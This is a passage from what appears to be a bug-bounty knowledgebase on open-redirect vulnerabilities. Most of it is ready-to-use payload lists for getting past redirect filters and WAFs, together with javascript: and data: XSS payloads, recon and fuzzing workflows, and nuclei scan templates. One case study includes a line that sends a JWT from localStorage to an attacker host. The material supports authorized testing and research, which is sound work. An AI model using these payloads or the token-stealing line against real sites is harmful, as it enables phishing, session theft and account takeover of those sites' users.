////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
https://www.google.com/%2f%2e%2e
https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https://www.google.com/%2f%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
//google.com/
//www.whitelisteddomain.tld@google.com/
///google.com/
///www.whitelisteddomain.tld@google.com/
////google.com/
////www.whitelisteddomain.tld@google.com/
https://google.com/
https://www.whitelisteddomain.tld@google.com/
/https://google.com/
/https://www.whitelisteddomain.tld@google.com/
//google.com//
//www.whitelisteddomain.tld@google.com//
///google.com//
///www.whitelisteddomain.tld@google.com//
////google.com//
////www.whitelisteddomain.tld@google.com//
https://google.com//
https://www.whitelisteddomain.tld@google.com//
//https://google.com//
//https://www.whitelisteddomain.tld@google.com//
//www.google.com/%2e%2e%2f
//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
///www.google.com/%2e%2e%2f
///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
////www.google.com/%2e%2e%2f
////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
https://www.google.com/%2e%2e%2f
https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
//https://www.google.com/%2e%2e%2f
//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
///www.google.com/%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2e%2e
////www.google.com/%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2e%2e
https:///www.google.com/%2e%2e
https:///www.whitelisteddomain.tld@www.google.com/%2e%2e
//https:///www.google.com/%2e%2e
//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e
/https://www.google.com/%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2e%2e
///www.google.com/%2f%2e%2e
///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
////www.google.com/%2f%2e%2e
////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
https:///www.google.com/%2f%2e%2e
https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https://www.google.com/%2f%2e%2e
/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
/https:///www.google.com/%2f%2e%2e
/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e
```

### Japanese/Unicode Slash Characters

```
〱google.com
〵google.com
ゝgoogle.com
ーgoogle.com
ｰgoogle.com
/〱google.com
/〵google.com
/ゝgoogle.com
/ーgoogle.com
/ｰgoogle.com
```

### Parameter Pollution

```
?next=whitelisted.com&next=evil.com
?redirect=whitelisted.com&redirect=evil.com
```

Some frameworks parse only the last occurrence of a parameter.

---

## Browser Quirks

### Chrome Behavior

- Treats `\` as path separator (WHATWG)
- Allows `-.` and `_.` in domains
- Normalizes Unicode in URLs
- `https://example.com\@evil.com/` -> navigates to `evil.com`

### Safari Behavior

- More permissive domain validation
- Allows many special characters in domains: `,. ; ! ' " ( ) { } * & ` + = ~ $`
- `https://example.com.,.evil.com/` -> valid domain

### Firefox Behavior

- Allows `+` and `$` in domains
- Strict WHATWG compliance
- `https://example.com.+.evil.com/` -> valid in Firefox

### Internet Explorer / Edge Legacy

- Legacy URL parsing quirks
- Different handling of `@` in file:// URLs
- Various encoding quirks

### Null Byte Handling

```
//google%00.com
```

Some browsers stop parsing at null byte, some ignore it, some treat it as end of string.

---

## Real World Case Studies

### Case Study 1: OAuth redirect_uri on Major Platform

**Vulnerability:** OAuth `redirect_uri` accepted any subdomain of registered domain.

**Attack:**
```
redirect_uri=https://evil-victim.com/callback
```

Where `evil-victim.com` was attacker-controlled subdomain.

**Impact:** Authorization code theft, account takeover.

**Bounty:** $15,000

### Case Study 2: Login Redirect to XSS

**Vulnerability:** Login page `?next=` parameter accepted `javascript:` protocol.

**Attack:**
```
/login?next=javascript:fetch('https://evil.com/steal?token='+localStorage.getItem('jwt'))
```

**Impact:** JWT theft, session hijacking.

**Bounty:** $5,000

### Case Study 3: CDN Cache Poisoning via Open Redirect

**Vulnerability:** CDN cached 302 redirects from `/redirect?url=` endpoint.

**Attack:**
```
/redirect?url=https://evil.com/phishing
```

**Impact:** Mass phishing of all users hitting cached URL.

**Bounty:** $10,000

### Case Study 4: Reverse Proxy SSRF via Host Header

**Vulnerability:** Reverse proxy misrouted requests based on Host header.

**Attack:**
```
GET / HTTP/1.1
Host: internal-admin.burpcollaborator.net
```

**Impact:** Access to internal admin panel, SSRF.

**Bounty:** $15,000 (Yahoo)

### Case Study 5: BT ISP Proxy Exposure

**Discovery:** BT ISP was intercepting HTTP traffic and routing through proxies.

**Attack:** Access to proxy admin panel via malformed Host header.

**Impact:** Potential content injection for millions of users.

**Resolution:** Reported to BT, quickly fixed.

---

## Fuzzing Payloads

### Basic Fuzzing List

```
https://evil.com
http://evil.com
//evil.com
///evil.com
////evil.com
/evil.com
\evil.com
\evil.com
\\evil.com
\\evil.com
https:evil.com
http:evil.com
https:/evil.com
http:/evil.com
https:\evil.com
http:\evil.com
https:////evil.com
http:///evil.com
https:///evil.com
https://evil.com/
https://evil.com//
https://evil.com///
https://evil.com/%2e%2e
https://evil.com/%2e%2e%2f
https://evil.com/%2f%2e%2e
https://evil.com/%2f..
https://evil.com/../
https://evil.com/..;/
https://evil.com/..%5c
https://evil.com/..%2f
https://evil.com/%2e%2e/
https://evil.com/%2e%2e%2f/
https://evil.com/%2e%2e%5c/
https://evil.com/..%00
https://evil.com%00/
https://evil.com%09/
https://evil.com%0A/
https://evil.com%0D/
https://evil.com%0D%0A/
https://evil.com%20/
https://evil.com%23/
https://evil.com%26/
https://evil.com%3F/
https://evil.com%40/
https://evil.com%5C/
https://evil.com%2F/
https://evil.com%3A/
https://evil.com%3B/
https://evil.com%3C/
https://evil.com%3D/
https://evil.com%3E/
https://evil.com%5B/
https://evil.com%5D/
https://evil.com%5E/
https://evil.com%60/
https://evil.com%7B/
https://evil.com%7C/
https://evil.com%7D/
https://evil.com%7E/
```

### Advanced Fuzzing with Special Characters

```
%01https://evil.com
%02https://evil.com
%03https://evil.com
%04https://evil.com
%05https://evil.com
%06https://evil.com
%07https://evil.com
%08https://evil.com
%09https://evil.com
%0Ahttps://evil.com
%0Bhttps://evil.com
%0Chttps://evil.com
%0Dhttps://evil.com
%0Ehttps://evil.com
%0Fhttps://evil.com
%10https://evil.com
%11https://evil.com
%12https://evil.com
%13https://evil.com
%14https://evil.com
%15https://evil.com
%16https://evil.com
%17https://evil.com
%18https://evil.com
%19https://evil.com
%1Ahttps://evil.com
%1Bhttps://evil.com
%1Chttps://evil.com
%1Dhttps://evil.com
%1Ehttps://evil.com
%1Fhttps://evil.com
%20https://evil.com
h%09ttps://evil.com
h%0Attps://evil.com
h%0Dttps://evil.com
https%09://evil.com
https%0A://evil.com
https%0D://evil.com
%09https%09://evil.com
%0Ahttps%0A://evil.com
%0Dhttps%0D://evil.com
%23evil.com
https:%40evil.com
%40evil.com
https://%09evil.com/
https://%0Aevil.com/
https://%0Devil.com/
https://%0D%0Aevil.com/
%0D%0A//evil.com
%0D%0A\evil.com
/%09/evil.com
/%0A/evil.com
/%0D/evil.com
/%0D%0A/evil.com
\%09\evil.com
\%0A\evil.com
\%0D\evil.com
\%0D%0A\evil.com
```

---

## Automation Workflows

### Recon Workflow

```bash
# 1. Enumerate subdomains
subfinder -d target.com -o subs.txt

# 2. Probe for live hosts
httpx -l subs.txt -o live.txt

# 3. Crawl for redirect parameters
katana -list live.txt -o crawl.txt

# 4. Extract URLs with redirect parameters
cat crawl.txt | grep -E '\?(url|redirect|next|return|redirect_uri|redir|target|dest|destination|continue|go|view|callback|return_to|return_path)='

# 5. Fuzz with open redirect payloads
ffuf -u "https://target.com/redirect?url=FUZZ" -w openredirect.txt -mc 302,301,307,308

# 6. Check for DOM-based redirects
cat crawl.txt | grep -E '(location\.hash|location\.href|location\.search|window\.location|document\.location)'
```

### Nuclei Scanning Workflow

```bash
# Scan for open redirects
nuclei -l live.txt -t http/vulnerabilities/open-redirect/

# Scan for SSRF (which may use open redirects)
nuclei -l live.txt -t http/vulnerabilities/ssrf/

# Scan for OAuth vulnerabilities
nuclei -l live.txt -t http/vulnerabilities/oauth/
```

### Automated Detection Script

```bash
#!/bin/bash
# open_redirect_scanner.sh

TARGET=$1
WORDLIST="openredirect.txt"
PARAMS="params.txt"

# Generate test URLs
while read param; do
    while read payload; do
        echo "https://${TARGET}/redirect?${param}=${payload}"
    done < "$WORDLIST"
done < "$PARAMS" | httpx -mr "Location: (https?://|//)" -o results.txt
```

---

## Recon Methodology

### Phase 1: Parameter Discovery

1. **Manual inspection:** Look for redirect parameters in URLs
2. **Source code review:** Search for `redirect`, `location`, `href`, `url` in JS files
3. **Crawling:** Use katana, gau, waybackurls to find historical redirect URLs
4. **Parameter mining:** Use Arjun, x8 to discover hidden parameters

### Phase 2: Technology Identification

1. **Framework detection:** Wappalyzer, builtwith
2. **URL parsing library:** Check source maps, JS bundles for URL parsing
3. **OAuth/OpenID presence:** Check for `/.well-known/openid-configuration`
4. **CDN/Proxy identification:** Check headers for Cloudflare, Akamai, etc.

### Phase 3: Filter Analysis

1. **Basic payload:** `https://evil.com` -- does it redirect?
2. **Protocol-relative:** `//evil.com` -- does it work?
3. **Path-based:** `/evil.com` -- does it work?
4. **Scheme confusion:** `https:evil.com` -- does it work?
5. **@ trick:** `https://trusted.com@evil.com` -- does it work?
6. **Backslash:** `https://trusted.com\evil.com` -- does it work?

### Phase 4: Impact Assessment

1. **OAuth context:** Can it steal authorization codes?
2. **Login context:** Can it steal credentials/JWTs?
3. **SSRF context:** Can it bypass SSRF filters?
4. **Cache context:** Can it poison CDN caches?
5. **XSS context:** Does it accept `javascript:`?

### Phase 5: Chaining

1. **Chain with XSS:** `javascript:` payload
2. **Chain with SSRF:** Use trusted domain redirect
3. **Chain with OAuth:** Steal authorization codes
4. **Chain with cache:** Poison CDN/proxy

---

## Nuclei Templates

### Basic Open Redirect Template

```yaml
id: open-redirect-basic

info:
  name: Open Redirect - Basic
  author: yourname
  severity: medium
  description: Detects basic open redirect vulnerabilities
  tags: redirect, oob

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?next=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?return=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?redirect_uri=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?target=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?dest=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?continue=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?go=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?return_to=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?return_path=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?redir=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?rurl=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?checkout_url=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?image_url=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?view=https://{{interactsh-url}}"
      - "{{BaseURL}}/redirect?destination=https://{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "https"
```

### Protocol-Relative Open Redirect

```yaml
id: open-redirect-protocol-relative

info:
  name: Open Redirect - Protocol Relative
  author: yourname
  severity: medium
  description: Detects protocol-relative open redirect bypasses

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=//{{interactsh-url}}"
      - "{{BaseURL}}/redirect?next=//{{interactsh-url}}"
      - "{{BaseURL}}/redirect?return=//{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

### Backslash Open Redirect

```yaml
id: open-redirect-backslash

info:
  name: Open Redirect - Backslash Bypass
  author: yourname
  severity: medium
  description: Detects backslash-based open redirect bypasses

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=https://{{Hostname}}\.{{interactsh-url}}"
      - "{{BaseURL}}/redirect?next=https://{{Hostname}}\.{{interactsh-url}}"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

### OAuth redirect_uri Validation

```yaml
id: oauth-redirect-uri-validation

info:
  name: OAuth redirect_uri Validation Bypass
  author: yourname
  severity: high
  description: Tests OAuth redirect_uri for open redirect

requests:
  - method: GET
    path:
      - "{{BaseURL}}/oauth/authorize?client_id=test&redirect_uri=https://{{interactsh-url}}/callback&response_type=code"
      - "{{BaseURL}}/auth?client_id=test&redirect_uri=https://{{interactsh-url}}/callback&response_type=code"
      - "{{BaseURL}}/authorize?client_id=test&redirect_uri=https://{{interactsh-url}}/callback&response_type=code"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

### DOM-Based Open Redirect Detection

```yaml
id: dom-open-redirect

info:
  name: DOM-Based Open Redirect
  author: yourname
  severity: medium
  description: Detects DOM-based open redirect sinks

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: regex
        part: body
        regex:
          - "location\s*=\s*.*hash"
          - "location\.href\s*=\s*"
          - "location\.replace\s*\("
          - "location\.assign\s*\("
          - "window\.location\s*=\s*"
          - "window\.open\s*\("
```

---

## Tools and Scanners

### Essential Tools

| Tool | Purpose | Command |
|------|---------|---------|
| **Burp Suite** | Manual testing, Collaborator | Professional/Community |
| **Nuclei** | Automated scanning | `nuclei -l targets.txt -t open-redirect/` |
| **Katana** | Web crawler | `katana -u target.com` |
| **Httpx** | Live host probing | `httpx -l subs.txt` |
| **Subfinder** | Subdomain enumeration | `subfinder -d target.com` |
| **FFUF** | Fuzzing | `ffuf -u URL -w payloads.txt` |
| **Gau** | URL enumeration | `gau target.com` |
| **Waybackurls** | Historical URLs | `waybackurls target.com` |
| **Arjun** | Parameter discovery | `arjun -u target.com` |
| **Interactsh** | OOB interaction | `interactsh-client` |
| **Cariddi** | URL extraction | `cariddi -u target.com` |
| **CursedChrome** | Chrome extension testing | Chrome extension |

### Burp Suite Extensions

- **Collaborator Everywhere:** Automatically injects payloads to decloak backend systems
- **DOM Invader:** Detects DOM-based vulnerabilities
- **Hackability:** Probes rendering engine capabilities
- **Logger++:** Enhanced logging for redirect analysis

### Custom Scanner Setup

```bash
# Install tools
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run full recon pipeline
subfinder -d target.com | httpx | katana | nuclei -t http/vulnerabilities/open-redirect/
```

---

## Advanced Research

### Unicode Normalization Attacks

If server applies Unicode normalization AFTER filtering:

#### Alternative Dot Characters (normalize to `.`)
```
https://example%CB%91com/
https://example%CB%99com/
https://example%D5%9Fcom/
https://example%D7%83com/
https://example%D9%ABcom/
https://example%DB%94com/
https://example%E0%A5%B0com/
https://example%E1%8D%A2com/
https://example%E1%99%AEcom/
https://example%E1%9B%ABcom/
https://example%E1%9F%94com/
https://example%E2%80%A4com/
https://example%E2%80%A7com/
https://example%E2%A0%A8com/
https://example%E2%B8%B1com/
https://example%E2%B8%B3com/
https://example%EF%B9%92com/
https://example%EF%BC%8Ecom/
https://example%EF%BD%A1com/
https://example%EF%BF%BDcom/
```

#### Empty String Characters
```
https://%E2%80%8Bexample.com/     # Zero-width space
https://%E2%81%A0example.com/     # Word joiner
https://%C2%ADexample.com/        # Soft hyphen
https://%CD%8Fexample.com/        # Combining grapheme joiner
https://%E1%A0%8Bexample.com/     # Myanmar sign
https://%E1%A0%8Cexample.com/
https://%E1%A0%8Dexample.com/
https://%E1%A0%8Eexample.com/
https://%E1%A0%8Fexample.com/
https://%E2%81%A4example.com/     # Invisible plus
```

#### Alternative Space Characters
```
%C2%A0https://example.com/        # No-break space
%E1%8D%A1https://example.com/     # Ethiopic wordspace
%E1%9A%80https://example.com/      # Ogham space mark
%E2%80%80https://example.com/      # En quad
%E2%80%81https://example.com/      # Em quad
%E2%80%82https://example.com/      # En space
%E2%80%83https://example.com/      # Em space
%E2%80%84https://example.com/      # Three-per-em space
%E2%80%85https://example.com/      # Four-per-em space
%E2%80%86https://example.com/      # Six-per-em space
%E2%80%87https://example.com/      # Figure space
%E2%80%88https://example.com/      # Punctuation space
%E2%80%89https://example.com/      # Thin space
%E2%80%8Ahttps://example.com/      # Hair space
%E2%80%A8https://example.com/      # Line separator
%E2%80%A9https://example.com/      # Paragraph separator
%E2%80%AFhttps://example.com/      # Narrow no-break space
%E2%81%9Fhttps://example.com/      # Medium mathematical space
%E3%80%80https://example.com/      # Ideographic space
```

#### Alternative @ Characters
```
https://{whitelisteddomain}%EF%B9%ABexample.com/     # Small @
https://{whitelisteddomain}%EF%BC%A0example.com/     # Fullwidth @
```

#### Alternative # Characters
```
https://example.com%EF%B9%9F{whitelisteddomain}/      # Small #
https://example.com%EF%BC%83{whitelisteddomain}/      # Fullwidth #
```

#### Alternative & Characters
```
https://example.com%EF%BC%86{whitelisteddomain}/      # Fullwidth &
https://example.com%EF%B9%A0{whitelisteddomain}/      # Small &
```

#### Alternative : Characters
```
https://example.com%EF%BC%9A{whitelisteddomain}/      # Fullwidth :
https://example.com%EF%B9%95{whitelisteddomain}/      # Small :
https://example.com%EF%B8%93{whitelisteddomain}/
https://example.com%EF%B8%99{whitelisteddomain}/
https://example.com%EF%B8%B0{whitelisteddomain}/
```

#### Alternative ? Characters
```
https://example.com%EF%BC%9F{whitelisteddomain}/      # Fullwidth ?
https://example.com%EF%B9%96{whitelisteddomain}/      # Small ?
```

#### Alternative / Characters
```
https://example.com%EF%BC%8F{whitelisteddomain}/      # Fullwidth /
https://example.com%EF%B9%8D{whitelisteddomain}/      # Small /
https://example.com%EF%B8%8F{whitelisteddomain}/
```

#### Alternative . Characters
```
https://example.com%EF%BC%8E{whitelisteddomain}/      # Fullwidth .
https://example.com%EF%B9%92{whitelisteddomain}/      # Small .
```

---

## Bug Bounty Writeups

### Notable Writeups and Research

1. **PortSwigger Research: Hidden OAuth Attack Vectors**
   - Discovery of OAuth redirect_uri bypasses via path traversal, wildcards, and URL encoding
   - Session poisoning race conditions in OAuth flows
   - SSRF via dynamic client registration endpoints

2. **PortSwigger Research: Cracking the Lens**
   - Reverse proxy misrouting via Host header manipulation
   - Apache HttpComponents URI parsing bug
   - Incapsula host header parsing bypass
   - BT ISP proxy exposure

3. **Diverto Research: Open Redirection URL Filter Bypasses (2024)**
   - Comprehensive analysis of URL parser confusion
   - Browser-specific domain validation quirks
   - Unicode normalization bypass techniques

4. **Infosec Writeups: Open Redirect to Account Takeover Chains**
   - OAuth + Open Redirect = ATO
   - Login CSRF + Open Redirect chains
   - JWT exfiltration via login redirects

5. **Yassine Aboukir: Open Redirect Leads to XSS**
   - Stored DOM XSS via login redirect parameters
   - javascript: protocol abuse in redirect contexts
   - Credential theft via DOM-based redirects

---

## Payload Collections

### Complete Open Redirect Payload List (Consolidated)

```
# Basic redirects
https://evil.com
http://evil.com
//evil.com
///evil.com
////evil.com

# Protocol-relative
//evil.com
///evil.com
////evil.com
/////evil.com

# Scheme confusion
https:evil.com
http:evil.com
https:/evil.com
http:/evil.com
https:\evil.com
http:\evil.com
https:////evil.com
http:///evil.com

# Path-based
/evil.com
\evil.com
\evil.com
\\evil.com
\\evil.com

# @ tricks
http://trusted.com@evil.com/
http://user:pass@evil.com/
http://trusted.com+@evil.com/
http://evil.com:80?@trusted.com/

# Backslash tricks
https://trusted.com\evil.com/
https://trusted.com/\evil.com/
https://trusted.com\/evil.com/

# Double encoding
https://evil.com%252f
https://evil.com%255c
https://evil.com%2540

# CRLF injection
java%0d%0ascript%0d%0a:alert(0)

# javascript: variants
javascript:alert(1)
JaVaScRiPt:alert(1)
java%0ascript:alert(1)
javascript://something%0aalert(1)

# data: URI
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=

# IP address bypasses
http://3627734734
http://0xd83ad6ce
http://0330.072.0326.0316
http://[::216.58.214.206]

# Unicode bypasses
https://evil.com%EF%BC%8Ftrusted.com/      # Fullwidth slash
https://evil.com%EF%B9%ABtrusted.com/      # Small @
https://evil.com%EF%BC%A0trusted.com/      # Fullwidth @

# Parameter pollution
?next=trusted.com&next=evil.com
?redirect=trusted.com&redirect=evil.com
```

---

## WAF Bypasses

### Common WAF Rules and Bypasses

**Rule:** Block `http://` and `https://` in redirect parameter

**Bypasses:**
```
//evil.com
///evil.com
\evil.com
\\evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**Rule:** Block `@` symbol

**Bypasses:**
```
https://evil.com%40trusted.com/
https://evil.com%2540trusted.com/
https://evil.com%EF%B9%ABtrusted.com/     # Small @
```

**Rule:** Block `javascript:` scheme

**Bypasses:**
```
java%0d%0ascript:alert(1)
JaVaScRiPt:alert(1)
java%0ascript:alert(1)
javascript://comment%0aalert(1)
```

**Rule:** Allow only specific domains

**Bypasses:**
```
https://trusted.com\evil.com/
https://trusted.com.evil.com/
https://evil.com?trusted.com
https://evil.com#trusted.com
```

---

## Detection Techniques

### Manual Detection

1. **Identify redirect parameters:** Look for `?url=`, `?redirect=`, `?next=`, etc.
2. **Test basic payload:** Submit `https://evil.com` and observe response
3. **Check status code:** Look for 301/302/307/308 redirects
4. **Check Location header:** Verify redirect destination
5. **Test bypass techniques:** Try protocol-relative, @ tricks, backslash
6. **Check for DOM-based:** Look for `location.hash`, `window.location` in JS

### Automated Detection

1. **Crawling:** Use katana, gau to discover redirect endpoints
2. **Fuzzing:** Use ffuf with open redirect wordlist
3. **Nuclei scanning:** Use open-redirect templates with interactsh
4. **Burp Scanner:** Use active scan with redirect insertion points
5. **Source analysis:** Search JS files for redirect sinks

### Verification

1. **Confirm redirect:** Ensure the server actually redirects (not just reflects)
2. **Check for validation:** Determine what filters are in place
3. **Test bypasses:** Try multiple bypass techniques
4. **Assess impact:** Determine if chainable with other vulnerabilities
5. **Document:** Record exact payload, response, and impact

---

## References

### Official Documentation
- [MDN: HTTP Redirections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections)
- [MDN: Location API](https://developer.mozilla.org/en-US/docs/Web/API/Location)
- [RFC 3986: URI Generic Syntax](https://tools.ietf.org/html/rfc3986)
- [WHATWG URL Standard](https://url.spec.whatwg.org/)
- [OWASP: Open Redirect](https://owasp.org/www-community/attacks/Open_redirect)

### PortSwigger Resources
- [PortSwigger: Open Redirection](https://portswigger.net/web-security/open-redirection)
- [PortSwigger: DOM-Based Open Redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- [PortSwigger: URL Validation Bypass Cheat Sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
- [PortSwigger: Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [PortSwigger: Cracking the Lens](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)

### GitHub Repositories
- [PayloadsAllTheThings: Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [PayloadBox: Open Redirect Payload List](https://github.com/payloadbox/open-redirect-payload-list)
- [0dayCTF: OpenRedirectPayloads](https://github.com/0dayCTF/OpenRedirectPayloads)
- [renniepak: open-redirection-payloads](https://github.com/renniepak/open-redirection-payloads)
- [bugbountyforum: openredirect-payloads](https://github.com/bugbountyforum/openredirect-payloads)
- [ProjectDiscovery: Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/open-redirect)
- [ProjectDiscovery: Nuclei](https://github.com/projectdiscovery/nuclei)
- [ProjectDiscovery: Katana](https://github.com/projectdiscovery/katana)
- [ProjectDiscovery: Httpx](https://github.com/projectdiscovery/httpx)
- [ProjectDiscovery: Subfinder](https://github.com/projectdiscovery/subfinder)
- [ProjectDiscovery: Interactsh](https://github.com/projectdiscovery/interactsh)

### Research and Writeups
- [HackTricks: Open Redirect](https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html)
- [Diverto: Open Redirection URL Filter Bypasses (2024)](https://diverto.github.io/2024/12/30/open-redirection-url-filter-bypasses)
- [Infosec Writeups: Open Redirect to ATO Chains](https://infosecwriteups.com/open-redirect-to-account-takeover-chains-3cbb4f7a22b5)
- [Yassine Aboukir: Open Redirect Leads to XSS](https://medium.com/@yassineaboukir/open-redirect-leads-to-xss-3f3b4f40f1f0)
- [Nahamsec: Open Redirect Resources](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/open_redirect.md)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [OWASP Top 25 Parameters](https://github.com/lutfumertceylan/top25-parameter)
- [Cariddi](https://github.com/edoardottt/cariddi)
- [CursedChrome](https://github.com/mandatoryprogrammer/CursedChrome)
- [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)

---

> **End of Knowledgebase**
> 
> This document is a living reference. Contributions, corrections, and additions are welcome.
> For the latest research, follow PortSwigger Research, ProjectDiscovery, and the bug bounty community.
